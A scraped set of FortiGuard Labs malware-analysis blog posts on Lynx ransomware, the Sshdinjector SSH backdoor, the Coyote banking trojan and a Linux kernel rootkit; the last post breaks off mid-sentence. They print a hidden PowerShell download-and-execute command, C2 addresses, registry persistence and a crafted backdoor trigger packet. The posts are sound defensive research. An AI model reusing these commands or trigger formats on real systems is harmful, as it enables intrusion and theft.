    "content": "FortiGuard Labs Threat Research FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the Lynx ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft WindowsImpact:Encrypts victims' files and demands ransom for file decryptionSeverity level:High 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The first sample of the Lynx ransomware was made available on a publicly available file-scanning site in early July 2024, which coincides with other reports of its first availability. Our research found that the Lynx and INC ransomware, which first appeared in July 2023, look very similar. However, INC offers fewer options at the execution phase. We believe that INC ransomware is a predecessor to the Lynx ransomware. While INC ransomware is available for the Windows and ESXi platforms, we have not found a Lynx variant of the ransomware that affects non-Windows environments. The screenshot above shows the different options and functions an INC ransomware sample can perform. In contrast, the screenshot below shows what they are for a LYNX sample. LYNX ransomware offers more granular control than INC. Like most ransomware, INC and LYNX encrypt files on victims' Windows machines. Both families use the same encryption methods. Furthermore, both families modify the desktop background to display the ransom note. At the same time, both try to send the ransom note to connected printers. These can be seen in the following screenshots. Like other ransomware attacks, these demand a ransom to decrypt files via dropped ransom notes. Information on the infection vector used by the Lynx ransomware threat actor is unavailable. However, it is not likely to differ significantly from other ransomware groups. When run, the Lynx ransomware takes the following line arguments: Option Description --file <filePath> Encrypt only specified file(s) --dir <dirPath> Encrypt only specified directory/directories --mode fast Encrypt 5% from entire file --mode medium Encrypt 15% from entire file (default) --mode slow Encrypt 25% from entire file --mode entire Encrypt 100% from entire file --help Print this message --verbose Enable verbosity --silent Enable silent encryption (no extension and notes will be added) --stop-processes Try to stop processes via RestartManager --encrypt-network Encrypt network shares --load-drives Load hidden drives (will corrupt boot loader) --hide-cmd Hide console window --no-background Don't change background image --no-print Don't print note on printers --kill Kill processes/services --safe-mode Enter safe-mode The Lynx ransomware always kills processes containing the following strings to maximize damage: It kills services that contain the following strings: The Lynx ransomware then encrypts files on the compromised machines and adds a file extension “.LYNX” to the affected files. The ransomware avoids encrypting files in the following folders: The Lynx ransomware avoids encrypting files with the following extensions: It also performs the following actions: The Lynx ransomware drops the following ransom note in “README.txt”: The ransomware then replaces the desktop wallpaper with the same ransom message. The oldest Lynx ransomware sample (SHA2: eaa0e773eb593b0046452f420b6db8a47178c09e6db0fa68f6a2d42c3f48e3bc) displays a slightly different ransom note. It contains different TOR sites and an attacker email address not found in other Lynx ransomware. The ransom note directs victims to a chat site operated by the attacker on TOR, where victims must first register with a unique ID. The Lynx ransomware has a data leak site that posts victim information, including data stolen from victims. As of this writing (January 29, 2025), the data leak site lists 96 victims, with the latest publication date being January 20, 2025. Our investigation found the following about the Lynx ransomware victims listed on the data leak site: Note that victims who paid the ransom may have been removed from the data leak site, and as such, additional companies may be affected by the Lynx ransomware. Separate from the aforementioned chat site, the Lynx ransomware group operates a data leak site on TOR. The Lynx ransomware group claims they have a policy to exclude “governmental institutions, hospitals, or non-profit organizations as these sectors play vital roles in society.” However, some victims listed on the data leak site are organizations believed to be in the healthcare and energy sectors. As with other ransomware groups, each victim has its own data leak page with a description of the stolen documents, the revenue of the victim organization, and the date the data was leaked. The Lynx ransomware described in this report are detected and blocked by FortiGuard Antivirus as: FortiGate, FortiMail, FortiClient, and FortiEDR support theFortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. Lynx Ransomware File IOCs SHA2 Note 31de5a766dca4eaae7b69f807ec06ae14d2ac48100e06a30e17cc9acccfd5193 Lynx ransomware 3e68e5742f998c5ba34c2130b2d89ca2a6c048feb6474bc81ff000e1eaed044e 432f549e9a2a76237133e9fe9b11fbb3d1a7e09904db5ccace29918e948529c6 468e3c2cb5b0bbc3004bbf5272f4ece5c979625f7623e6d71af5dc0929b89d6a 4e5b9ab271a1409be300e5f3fd90f934f317116f30b40eddc82a4dfd18366412 571f5de9dd0d509ed7e5242b9b7473c2b2cbb36ba64d38b32122a0a337d6cf8b 589ff3a5741336fa7c98dbcef4e8aecea347ea0f349b9949c6a5f6cd9d821a23 80908a51e403efd47b1d3689c3fb9447d3fb962d691d856b8b97581eefc0c441 85699c7180ad77f2ede0b15862bb7b51ad9df0478ed394866ac7fa9362bf5683 97c8f54d70e300c7d7e973c4b211da3c64c0f1c95770f663e04e35421dfb2ba0 9a47ab27d50df1faba1dc5777bdcfff576524424bc4a3364d33267bbcf8a3896 b378b7ef0f906358eec595777a50f9bb5cc7bb6635e0f031d65b818a26bdc4ee d5ca3e0e25d768769e4afda209aca1f563768dae79571a38e3070428f8adf031 eaa0e773eb593b0046452f420b6db8a47178c09e6db0fa68f6a2d42c3f48e3bc ecbfea3e7869166dd418f15387bc33ce46f2c72168f571071916b5054d7f6e49 f71fc818362b1465fc1deb361de36badc73ac4dd9e815153c9022f82c4062787 Due to the ease of disruption, damage to daily operations, potential impact on an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREEFortinet Certified Fundamentals (FCF)in Cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. FortiReconis a SaaS based Digital Risk Prevention Service backed by cybersecurity experts to provide unrivaled threat intelligence on the latest threat actor activity across the dark web, providing a rich understanding of threat actors’ motivations and TTPs. The service can detect evidence of attacks in progress allowing customers to rapidly respond to and shut down active threats. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. OurIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Additionally,FortiRecon Digital Risk Protection (DRP)is a SaaS-based service that provides a view of what adversaries are seeing, doing, and planning to help you counter attacks at the reconnaissance phase and significantly reduce the risk, time, and cost of later-stage threat mitigation. Ransomware Roundup FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-lynx"
  },
  {
    "title": "Analyzing ELF/Sshdinjector. A!tr with a Human and Artificial Analyst",
    "content": "FortiGuard Labs Threat Research Affected Platform:LinuxImpacted Users:Linux-based network appliances or IoTImpact:Data exfiltrationSeverity Level:Medium ELF/Sshdinjector.A!tris a collection of malware that can be injected into the SSH daemon. Samples of this malware collection surfaced around mid-November 2024. While we have a good amount of threat intelligence on them (e.g., they areattributed to theDaggerFlyespionage group), nobody seems to have looked into what they actually do. In this blog post, we will focus on the reverse engineering of the attack’s binaries and how this reverse engineering was achieved. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The attack uses several binaries: More precisely, the dropper checks if it is being run under root privileges and, if not, exits. It then checks whether the host is infected by searching for a file named/bin/lsxxxssswwdd11vv containingthe wordWATERDROP. If the host is not yet infected, it attempts to overwrite the legitimate binariesls,netstat,andcrondwith infected binaries (/bin/lsxxxssswwdd11vv,selfrecoverheader,mainpasteheade,r…). Finally, it searches the SSH daemon and, if necessary, infects it withlibsshd.so. The malicious payload is contained inlibsshd.so. The main element is found in a function named “haha.” It also creates two other threads from the functions “heihei” and “xixi”. Those three names refer to laughing in Chinese. Function “xixi” checks whether it has access to/root/intensify-mm-inject/xxx, in which case it will kill and restart both the SSH and Cron daemons. Function “heihei” connects to the remote C2 (hard-coded IP address 45.125.64[.]200, port 33200 or 33223) and listens for incoming commands. Command Id Description 1 SERVER_REQ_BASE_INFO. Exfiltrates uname, MAC address etc to C2 2 List running services, by listing files in/etc/init.d 3 Reads users from/etc/shadow 4 Lists running process 5 Tests access to/var/log/dmesg 6 Tests access to/tmp/fcontr.xml 7 Lists a given directory 8 File transfer 9 Opens a shell terminal 10 Executes a command in the terminal 11 Unloads and exits the malicious process 12 Removes a file 13 Renames a file 1000 SERVER_RET_ONLINE_ACK 0x80000001 Client status change notification. It sends base info, service list, read/etc/shadow. Communication with the C2 uses its own protocol. All packets include a hard-coded UUID (a273079c-3e0f-4847-a075-b4e1f9549e88), an identifier (afa8dcd81a854144), and the response to the command. Reverse engineering was performed using Radare2, assisted by Generative AI through theRadare2 extension“r2ai.” This study shows that AI provides excellent insights into the malware, delivering high-quality source code that complements the output obtained from a standard decompiler. For example, I usedr2ai in “auto” mode. In this mode, the user asks the AI a question, and the AI automatically performs the necessary steps with the radare2 disassembler to answer. This is particularly helpful for users who don’t know Radare2 well. In this screenshot, we see the AI automatically searches for strings in the binary, via r2’s command “iz”. The overview of the dropper is excellent.AI excels in reading large quantities of information and summarizing them. We can then ask the AI to decompile the main.While the AI-generated source code is easy to understand, its details are not always correct. By comparison, source code produced by decompilers is often difficult to read but is accurate. Because of this, it is important to remember that these approaches complement each other and are ideally viewed side by side. While AI performs very well, there are many cases in which it does not produce a satisfactory answer, at least not at first. The most common issue ishallucination, wherein the AIinventssomething that isn’t true. Worse, it’s not always easy for a human analyst to spot hallucinations because the AI can sound very convincing. For example, in the AI-generated code below, the AI completely created an upload and a download command that is pure invention. Another frequent issue isextrapolation, where the AI does not totally invent something butextrapolatesit. For example, the AI says the malware “manipulates” the MAC address. This is far-fetched. While itcreatesa string containing the host's MAC address and exfiltrates it, there is no modification of the MAC address. In a related example, the AI claims the malware hides its network communications. It does not. It hides on the OS by infecting common binaries such as netstat, but it does not attempt to hide the communication itself. Yet another issue isomissions. Omissions are the downside of AI’s power to summarize situations. Its summaries often lack the details a human would find important. For example, at some point, the malware tests access to a file named/tmp/fcontr.xml. Despite this being absolutely clear in the assembly,the first version of AI-generated code completely eluded this part. The solution to this issue is toask again by modifying the question/prompt for the AI. In this case, I simply added to the end of the prompt: “Please pay attention to what is around fcontr.xml” and it solved the problem. Of course, this requires knowing that something had been omitted in the first place. In fact,interactions with AI are seldom perfect in a single shot. Rather, they could be compared to a discussion with a capable colleague with impressive knowledge and intelligence but less intuition and experience. For this research, I kept my disassembler open. I used it several times to check for hallucinations, assist the AI (!) when it failed to find correct addresses or cross-references, or guide it to look into interesting parts. While disassemblers and decompilers have improved over the last decade, this cannot be compared to the level of innovation we are seeing with AI. This isoutstanding! AI is particularly good at providing overviews of samples and generating easy-to-understand source code.Fortunately—or not?—AI cannot workalone and must be piloted and complemented by competent human analysis to spot hallucinations(the most dangerous issues),refine questions, identify omissions, or guidethe AI in the most interesting direction. I haven’t discussedlanguage models yet. Obviously, r2ai’s results depend on the language model used. Language models are configurable, and we can conveniently switch from one to another, whether a local model or a remote one, free access or paid. The results from this article were mainly obtained using Claude 3.5 Sonnet 2024-10-22. Last but not least, this blog post was  written without AI assistance ;-) Fortinet customers are already protected from this malware variant through our AntiVirus as follows: FortiGuard Labs detects the sample with the following AV signatures: ELF/Sshdinjector.A!tr and Linux/Agent.ACQ!tr TheFortiGuard AntiVirus serviceis supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. 94e8540ea39893b6be910cfee0331766e4a199684b0360e367741facca74191f 0e2ed47c0a1ba3e1f07711fb90ac8d79cb3af43e82aa4151e5c7d210c96baebb 6d08ba82bb61b0910a06a71a61b38e720d88f556c527b8463a11c1b68287ce84 malware FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/analyzing-elf-sshdinjector-with-a-human-and-artificial-analyst"
  },
  {
    "title": "Coyote Banking Trojan: A Stealthy Attack via LNK Files",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Controls victim’s device and collects sensitive informationSeverity Level:High Over the past month, FortiGuard Labs has identified several similar LNK files containing PowerShell commands designed to execute malicious scripts and connect to remote servers. These files are part of multi-stage operations that ultimately deliver the Coyote Banking Trojan. This malware primarily targets users in Brazil, seeking to harvest sensitive information from over 70 financial applications and numerous websites. Once deployed, the Coyote Banking Trojan can carry out various malicious activities, including keylogging, capturing screenshots, and displaying phishing overlays to steal sensitive credentials. In this article, we will detail the behavior of each stage. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The LNK file executes the following PowerShell command, which connects to a remote server to initiate the next stage: -w hid -noni -ep Bypass -c “Start-Job -Name PSSGR -ScriptBlock { IEX (iwr -Uri ‘hxxps://tbet[.]geontrigame[.]com/zxchzzmism’ -UseBasicParsing).Content }; Start-Sleep 131.” We analyzed multiple malicious files by examining the “Machine ID” embedded within the LNK files. This unique identifier provides critical insights into the system where the LNK file originated. By extracting and analyzing this metadata, we traced connections to other malicious LNK files associated with Coyote. URLs in Arguments Machine ID MAC Address hxxps://tbet.geontrigame[.]com/zxchzzmism 0cb44b707681 aa:1c:b2:83:1d:72 hxxps://hrod.geontrigame[.]com/edsfluzevj a8025a01fc56 f5:12:59:16:ba:f7 hxxps://easi.geontrigame[.]com/wydqfchssb a8025a01fc56 f5:12:59:16:ba:f7 hxxps://iivi.geontrigame[.]com/zkrghotqvy a8025a01fc56 f5:12:59:16:ba:f7 hxxps://cuzo.geontrigame[.]com/pxylqhpuiv a8025a01fc56 f5:12:59:16:ba:f7 hxxps://btee.geontrigame[.]com/mvkrouhawm dc0bfa46899d e8:a5:d6:6a:57:02 hxxps://qmnw.daowsistem[.]com/fayikyeund dc0bfa46899d e8:a5:d6:6a:57:02 hxxps://bhju.daowsistem[.]com/iwywybzqxk dc0bfa46899d e8:a5:d6:6a:57:02 hxxps://lgfd.daowsistem[.]com/riqojhyvnr dc0bfa46899d e8:a5:d6:6a:57:02 hxxps://leme.daowsistem[.]com/omzowcicwp dc0bfa46899d e8:a5:d6:6a:57:02 hxxps://igow.scortma[.]com/fqieghffbm dc0bfa46899d e8:a5:d6:6a:57:02 hxxps://quit.scortma[.]com/xzcpnnfhxi dc0bfa46899d e8:a5:d6:6a:57:02 hxxps://llue.geontrigame[.]com/byyyfydxyf dc0bfa46899d e8:a5:d6:6a:57:02 hxxps://cxmp.scortma[.]com/qfutdbtqqu dc0bfa46899d e8:a5:d6:6a:57:02 hxxps://xrxw.scortma[.]com/gmdroacyvi dc0bfa46899d e8:a5:d6:6a:57:02 hxxps://qfab.geontrigame[.]com/vfofnzihsm dc0bfa46899d e8:a5:d6:6a:57:02 The content in “zxchzzmism” is an additional PowerShell script that holds two encoded data segments. This script employs specific commands to decode and execute the embedded shellcode, initiating the next phase of the malicious operation. The “bmwiMcDec” DLL file functions as a loader, utilizing VirtualAllocEx and WriteProcessMemory to inject the “npuGDec” payload. It then employs CreateRemoteThread to execute the injected malicious code, facilitating the continuation of the attack. The injected code leverages Donut, a tool designed to decrypt and execute the final MSIL (Microsoft Intermediate Language) payloads. This ensures seamless delivery and execution of the attack’s next stage. The decrypted MSIL execution file first establishes persistence by modifying the registry at “HCKU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.” It checks for any existing PowerShell command in this registry entry. If found, it removes the existing entry and creates a new one with a randomly generated name. This new registry entry contains a customized PowerShell command pointing to download and execute a Base64-encoded URL, which facilitates the main functions of the Coyote Banking Trojan. The targeted URL for this operation is “hxxps://yezh[.]geontrigame[.]com/vxewhcacbfqnsw.” If the victim is the new target, it gathers basic system information, such as the machine name, username, and operating system, and sends it to a remote server. It also identifies installed antivirus products by querying the SecurityCenter2 namespace in Windows Management Instrumentation (WMI). The collected data is then concatenated with a “|” separator, encoded in Base64, and the resulting string is reversed. This processed string is appended as a parameter and sent back to the remote server as follows: “hxxps://yezh[.]geontrigame[.]com/hqizjs/?l=y4CMuADfvJHUgATMgM3dvRmbpdFI0Z2bz9mcjlWT8JXZk5WZmVGRgM3dvRmbpdFfzlmcoNEf0IDR0Ul(omit).” After setting and checking in, it calls “CreateProcess” to execute the PowerShell command that was added into the registry to invoke the payload: The payload “vxewhcacbfqnsw” is similar to the one downloaded from the LNK file but is noticeably larger. This increase in size is due to the inclusion of the main Coyote Baking Trojan. We obtained the MSIL file after decrypting the payload from the Donut shellcode. It contained the following functions: Length Description 10 Disconnect from server 11 Terminate program 12 Take screenshot as image/jpeg 13 Get a window's title bar text 14 Activate a window and restore it to its original size 15 Minimize a window 16 Activate a window and restore it to its normal size then display it as a maximized window 17 Kill targeted process 18 Show full-screen overlay 19 Restore a window and then maximize it 20 Remove the window handle 21 Shut down the device 22 Enable the Desktop Window Manager composition feature then shut down the device 23 Click mouse at a specific screen position 24 Copy a string to the clipboard and then simulate typing that string 25 Send the specified keys to the active application. If a key contains a ‘+,’ it is sent as an uppercase character; otherwise, it is sent as a lowercase character. 26 Disable DWM composition 27 Display the fake image for a specific target with a message. For example: “Trabalhando nas atualiza” (Working on updates), “Aponte a câmera para a imagem a seguir” (Point the camera at the following image) 28 Cleanup, unhook, and stop current monitoring 29 Control user-visible windows, close the window 30 Adjust the opacity 31 Enable keylogger or send the keylogger’s result with separator ‘¾’ 32 N/A 33 Simulate key presses to perform automated navigation actions: {UP}, {RIGHT}, {DOWN}, and {LEFT} 34 Manipulate display settings 35 Send the given keys Coyote's infection process is complex and multi-staged. This attack leveraged an LNK file for initial access, which subsequently led to the discovery of other malicious files. This Trojan poses a significant threat to financial cybersecurity, particularly because it has the potential to expand beyond its initial targets. Consequently, it highlights the critical need for robust security measures for both individuals and institutions to safeguard against evolving cyber threats. The malware described in this report is detected and blocked byFortiGuard Antivirusas: LNK/Agent.D!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. TheFortiGuard Web FilteringService blocks the C2 server. We also suggest that organizations go through Fortinet’s free cybersecurity training module:Fortinet Certified Fundamentals (FCF)in Cybersecurity. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. hxxps://btee[.]geontrigame[.]com/mvkrouhawmjxxps://qmnw[.]daowsistem[.]com/fayikyeundhxxps://bhju[.]daowsistem[.]com/iwywybzqxkhxxps://lgfd[.]daowsistem[.]com/riqojhyvnrhxxps://leme[.]daowsistem[.]com/omzowcicwphxxps://igow[.]scortma[.]com/fqieghffbmhxxps://quit[.]scortma[.]com/xzcpnnfhxihxxps://llue[.]geontrigame[.]com/byyyfydxyfhxxps://cxmp[.]scortma[.]com/qfutdbtqquhxxps://xrxw[.]scortma[.]com/gmdroacyvihxxps://qfab[.]geontrigame[.]com/vfofnzihsmhxxps://tbet[.]geontrigame[.]com/zxchzzmismhxxps://yezh[.]geontrigame[.]com/vxewhcacbfqnsw geraatualiza[.]commasterdow[.]comgeraupdate[.]com 362af8118f437f9139556c59437544ae1489376dc4118027c24c8d5ce4d84e48330dffe834ebbe4042747bbe00b4575629ba8f2507bccf746763cacf63d655bb33cba89eeeaf139a798b7fa07ff6919dd0c4c6cf4106b659e4e56f15b5809287552d53f473096c55a3937c8512a06863133a97c3478ad6b1535e1976d1e0d45f64209e2348e6d503ee518459d0487d636639fa5e5298d28093a5ad41390ef6b067f371a683b2be4c8002f89492cd29d96dceabdbfd36641a27be761ee64605b173ad6be67691b65cee251d098f2541eef3cab2853ad509dac72d8eff5bd85bc07cbfbce482071c6df823f09d83c6868d0b1208e8ceb70147b64c52bb8b48bdb8839de445f714a32f36670b590eba7fc68b1115b885ac8d689d7b344189521012bea4f753707eba4088e8a51818d9de8e9ad0138495338402f05c5c7a800695a6f3c37b1de5983b30b9ae70c525f97727a56d3874533db1a6e3dc1355bfbf37ecfd0ef425d34b56d0bc08bd93e6ecb11541bd834b9d4d417187373b17055c862e Cara Lin,trojan FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/coyote-banking-trojan-a-stealthy-attack-via-lnk-files"
  },
  {
    "title": "Deep Dive Into a Linux Rootkit Malware",
    "content": "FortiGuard Labs Threat Research Affected platforms:CentOS LinuxImpacted parties:CentOS UsersImpact:Full remote control of a victim’s deviceSeverity level:Critical This is a follow-up analysis to a previous blog about azero day exploitwhere the FortiGuard Incident Response (FGIR) team examined how remote attackers exploited multiple vulnerabilities in an appliance to gain control of a customer’s system. At the end of that blog, we revealed that the remote attacker had deployed a rootkit (a loadable kernel module, sysinitd.ko) and a user-space binary file (sysinitd) on the affected system by executing a shell script (Install.sh). Additionally, to establish rootkit persistence, entries for the rootkit malware were added in the /etc/rc.local and /etc/rc.d/rc.local files so the rootkit malware is loaded during system startup. During our analysis of the image of the compromised device, we found that its Linux audit logs contained user-space shell commands executed by the Threat Actor on the appliance. The executed shell commands were stored as hexadecimal blobs in the audit logs.  One of the log entries found was as follows: 2024-09-07 03:26:18 When decoded, the hexadecimal resulted in a base64-encoded blob. Decoding the base64 blob produced a tgz file, which, upon decompression, produced the following two files. Analysis ofinstall.sh, which is an injector script, reveals that as a default, it installs a shareable object,sysinitd.so, in the location/usr/share/empty/. Pivoting from this, the FGIR team analyzed the image of the compromised Ivanti box and retrieved two malicious files created by the Threat Actor on the disk in the location/usr/share/empty/. One of the two files was the rootkit—the malicious kernel modulesysinitd.so, which is referred to as sysinitd.ko in this analysis. FortiGuard conducted an in-depth analysis of the malicious rootkit malware. This analysis reveals how the kernel module hijacks the inbound network traffic to the compromised Ivanti system, how the user-space malicious file is started, and how it communicates with the rootkit module. The analysis also sheds light on the overall purpose of the rootkit malware. The command “readelf –h sysinitd.ko” displays the kernel module's ELF (Executable and Linkable Format) file header information, as shown in Figure 1. Its ELF type is “REL (Relocatable file),” which is the expected type for the kernel modules. The kernel module is loaded and starts functioning after executing the command “insmod /usr/share/empty/init/sysinitd.ko,” as shown in Figure 2. When the kernel module is inserted into the kernel, its init_module() function is called. It performs some initialization tasks, such as setting values to some global variables, decrypting strings, registering a network hook function, creating file descriptors under the “/proc” folder, and more. Figure 3 illustrates how it decrypts the encrypted string by calling a function. In this example, the string “abrtinfo” has just been decrypted. It will be used later when creating procfs (process filesystem) entries. Next, the kernel module calls the kernel API, nf_register_hook(), to register a Netfilter hook. Figure 4 shows the contextual ASM instructions for calling nf_register_hook(). The API only takes the structure “nf_hook_ops” as its argument, which specifies a hook function, hook number, priority, and protocol family. The hook callback function is “network_hook_func_15()”(in Figure 4). The protocol family for the IPv4 protocol is 2. The hook number is 0 for NF_INET_PRE_ROUTING, a hook point in the Linux kernel's Netfilter framework where incoming packets are intercepted before any routing decision is made. This is typically the first point where packets are intercepted after they arrive in the system. One of the two files was the rootkit, which lists all the available values for the hook number option and their descriptions: Value Macro Description 0 NF_INET_PRE_ROUTING Packet received, before routing decision. 1 NF_INET_LOCAL_IN Packet destined for the local machine, after routing. 2 NF_INET_FORWARD Packet being forwarded to another machine. 3 NF_INET_LOCAL_OUT Packet originating from the local machine, before routing. 4 NF_INET_POST_ROUTING Packet after routing, ready for transmission. Afterward, the init_module() function of the kernel module (sysinitd.ko) creates three procfs entries in the folder “/proc/” using the kernel API proc_create_data(). The names of the procfs entries are taken from the string “abrtinfo” decrypted earlier. The following ASM instruction snippet demonstrates the creation of the three procfs entries. […] .text:023D6xorr8d, r8d .text:023D9movrcx, offset as_STDIN_FD .text:023E0xoredx, edx .text:023E2movesi, 1B6h; \"RW-RW-RW-\" .text:023E7movrdi, offset byte_3275; \"abrtinfo\" .text:023EEcallproc_create_data .text:023F3xorr8d, r8d .text:023F6movrcx, offset as_STDOUT_FD .text:023FDxoredx, edx .text:023FFmovesi, 1B6h; \"RW-RW-RW-\" .text:02404movrdi, offset byte_3276; \"brtinfo\" .text:0240Bmovcs:gv_26, rax .text:02412callproc_create_data .text:02417xorr8d, r8d .text:0241Amovrcx, offset as_control_STDIN_FD .text:02421xoredx, edx .text:02423movesi, 1B6h; \"RW-RW-RW-\" .text:02428movrdi, offset byte_3277; \"rtinfo\" .text:0242Fmovcs:gv_261, rax .text:02436callproc_create_data […] All the procfs entries’ permissions are set as 1B6h, which stands for “rw-rw-rw-,” granting read/write access to all users. Their names are all derived from the string “abrtinfo” but at different offsets: “abrtinfo” at offset 0x3275, “brtinfo” at offset 0x3276 and “rtinfo” at offset 0x3277. Figure 5 shows the three created files. The Install.sh determines whether the kernel module has been successfully loaded by checking whether “/proc/abrtinfo” has been created. We have learned that the three procfs entries act as file descriptors when the user-space process (sysinitd) runs, where “/proc/abrtinfo” will be sysinitd’s stdin, “/proc/brtinfo” will be sysinitd’s stdout, and “/proc/rtinfo” will pass the control commands to sysinitd. In the kernel module, there are many callback functions bound to these procfs entries: Linux calls the Netfilter hook function once the incoming IPv4 packets, UDP and TCP, arrive. The malware focuses solely on the TCP packets (the protocol value is 6). It compares the protocol value of the received packet and ignores non-TCP packets. TCP sessions are established with a three-way handshake. As a result, the attacker must establish a TCP session with the services running on the compromised system, such as HTTP (port 80), HTTPS (443), SSH (22), FTP (21), and more. For the hook function to recognize the packet from the attacker, the attacker must send a special packet to the compromised system (referred to as the attack-init packet (the first packet) in this analysis). The attack-init packet must be 0xd bytes long and in the following format: Offset Length Description 0x00 1 “\\x31” or “\\x30”. A flag to enable or disable encryption for traffic. 0x01 4 Verification data.  “Dw1” 0x05 4 Verification data.  “Dw5” 0x09 4 Verification data.  “Dw9” To get the packet through, it must also meet the following conditions: 1>  Dw1 == Dw9 ^ 0x32C21F0A2> Dw5 == Dw9 ^ 0xED22AF9E or Dw5 == Dw9 ^ 0x4B1EF486 An example of a crafted attack-init packet looks like this: “\\x30”+“\\x3E\\x2B\\xF6\\x06”+”\\xAA\\x9Bx16\\xD9”+”\\x34\\x34\\x34\\x34” Once the attack-init packet is verified, the kernel module records the source IP and Port and, in some global variables, the destination IP and Port. This ensures that subsequent traffic meeting the conditions will be recognized as coming from the attacker and only processed within the Netfilter hook function. Meanwhile, a series of kernel APIs are called, including queue_work_on(), kthread_create_on_node(), wake_up_process(), and call_usermodehelper(). Based on our analysis, these APIs start the user-space file (sysinitd). The call_usermodehelper() API is used in the Linux kernel to execute a user-space program from the kernel space. The function definition is: intcall_usermodehelper(constchar*path,char**argv,char**envp,intwait); According to the ASM instructions in Figure 6, it starts the user-space process with the command line argument “abrtinfo:0.” The path to the process, “/usr/share/empty/init/sysinitd,” is hardcoded in the kernel module. We explain how the user-space process works in the next section. All response packets from the kernel module have the same format, as shown in the table below: Offset Length Description 0x00 4 The size of the payload data. 0x04 Variable Payload data. The payload data is encrypted as long as the first byte in the attack-init packet is “\\x31.” The encryption key is calculated from the verification data in the attack-init packet, which is then returned to the attacker while the attack-init packet is being processed. Figure 7 shows a simulated attack scenario where the attacker (the client) sends an attack-init packet to the compromised system (the server). The rootkit malware verifies the packet, generates an encryption key (4 bytes) from the first packet and other related data, and sends it back to the attacker in a response packet. If the attack-init packet enables the encryption function, the encryption key will be used to encrypt and decrypt the payload data on both the client and server. Otherwise, both sides will discard the encryption key packet. From that point on, the attacker can communicate with the infected system. Incoming packets from the attacker are passed to the user-space process, which reads from “/proc/abrtinfo” via the read callback function. The kernel module also sends back the output of the user-space process when it writes data to “/proc/brtinfo.” Figure 8 shows a pseudo-code example of the read callback function assigned to “/proc/abrtinfo. \" This function calls a kernel API copy_to_user() to copy the attacker’s data to the user-space process (sysinitd). When the attacker sends 4-byte control commands to the compromised system, “/proc/rtinfo” is used to pass the commands to and control the user-space process. Command Action 0xB3FEB404 It passes 0xE1 to “/proc/rinfo”. 0x80CDD03C It passes 0xE2 to “/proc/rinfo”. 0x44724774 It passes 0xE4 to “/proc/rinfo”. The user-space file “sysinitd” was copied to “/usr/share/empty/init” in Install.sh. In reviewing its ELF header information in Figure 9, we find that the ELF type is EXEC, indicating that it is a user-space executable file. The sysinitd process is started by the kernel module. It disguises itself as a bash program by replacing its process name with “bash,” which is a decrypted string. Because of this, the system administrator is unlikely to identify it as malware. It then calls APIs to archive this, like the following C-code: memset(argv[0], 0, sizeof(argv[0])); strcpy(argv[0], “bash”); It then verifies whether its command-line argument is “abrtinfo” using the API strcmp(), as shown in Figure 10. If the command-line argument does not match, the process exits. Next, it invokes the Linux system call “fork()” to create a child process. From this point on, the parent and child processes follow different workflows. After fork() is initiated, it continues to set the current process’s standard input to “/proc/abrtinfo,” standard output, and standard error to 